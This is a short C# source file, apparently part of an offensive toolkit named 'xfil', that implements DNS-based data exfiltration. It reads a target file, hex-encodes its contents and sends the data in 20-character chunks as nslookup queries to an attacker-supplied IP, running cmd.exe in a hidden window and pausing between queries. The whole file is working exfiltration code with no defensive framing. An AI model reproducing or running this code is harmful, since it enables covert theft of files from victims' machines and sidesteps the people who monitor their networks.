using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace xfil
{
    public class dns_exfil
    {
        public static void dns_exfiltration(string ip, string file_exfil)
        {
            
            Console.WriteLine("[+] Preparing DNS exfil . . .");

            Process cmd = new Process();    
            ProcessStartInfo startInfo = new ProcessStartInfo();

            Console.WriteLine("[+] Reading file . . .");
            string text_b64 = File.ReadAllText(file_exfil);

            string hex = "";
            byte[] ba = Encoding.Default.GetBytes(text_b64);
            var hexString = BitConverter.ToString(ba);
            hexString = hexString.Replace("-", "");

            hex = hexString;

            Console.WriteLine("[+] Preparing the chunks . . .");
            Console.WriteLine("[+] Sending the DNS queries . . .");


            int chunkSize = 20;
            int stringLength = hex.Length;
            for (int i = 0; i < stringLength; i += chunkSize)
            {
                if (i + chunkSize > stringLength) chunkSize = stringLength - i;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C nslookup " + hex.Substring(i, chunkSize) + " " + ip;
                cmd.StartInfo = startInfo;
                cmd.Start();
                Thread.Sleep(1000);

            }


            Console.WriteLine("[+] Done!");
            

        }
    }
}
